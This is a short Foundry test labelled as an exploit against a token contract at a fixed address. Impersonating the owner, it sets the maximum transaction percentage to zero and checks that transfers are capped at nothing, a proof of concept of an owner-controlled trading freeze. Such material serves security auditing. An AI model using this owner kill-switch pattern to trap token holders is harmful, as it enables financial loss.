pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IONE1SHIBA {
        function owner() external view returns (address);
        function setMaxTxPercent(uint256 maxTxPercent) external;
        function _maxTxAmount() external view returns (uint256);
    }

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);
    IONE1SHIBA target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IONE1SHIBA(TARGET);
        owner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);
                target.setMaxTxPercent(0);
                vm.stopPrank();

                assertEq(target._maxTxAmount(), 0);

    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
